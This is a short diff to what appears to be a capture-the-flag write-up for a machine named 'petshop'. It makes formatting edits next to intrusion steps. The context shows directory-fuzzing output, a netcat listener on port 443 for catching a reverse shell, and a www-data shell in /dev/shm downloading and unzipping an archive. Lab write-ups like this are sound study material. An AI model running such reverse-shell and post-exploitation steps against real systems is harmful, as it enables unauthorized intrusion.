@@ -125,6 +125,8 @@ LICENSE                 [Status: 200, Size: 1085, Words: 156, Lines: 22]
 
 <img width="1119" height="253" alt="image" src="https://github.com/user-attachments/assets/83f6a820-cb61-46fb-aae2-aec2e28f7dc1" />
 
+<br>
+<br>
 
 ```bash
 :~# nc -nlvp 443
@@ -172,7 +174,7 @@ master.zip              [ <=>                ]  21.86K  --.-KB/s    in 0.001s
 ```
 
 ```bash
-...www-data@petshop:/dev/shm$ 
+www-data@petshop:/dev/shm$ 
 www-data@petshop:/dev/shm$ unzip master.zip
 Archive:  master.zip
 c68e35ae3eb7f49a398c7d7f35bb920c79dc9b0e
